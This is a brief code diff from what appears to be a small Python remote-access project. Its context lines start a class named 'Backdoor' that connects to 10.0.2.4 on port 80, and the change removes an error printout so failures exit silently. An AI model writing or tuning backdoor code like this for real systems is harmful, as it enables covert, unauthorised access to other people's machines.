@@ -8,6 +8,5 @@ if connection:
 		app = Server.Backdoor("10.0.2.4", 80)
 		app.run()
 	except Exception as e:
-	        print(e)
 	        sys.exit()
 
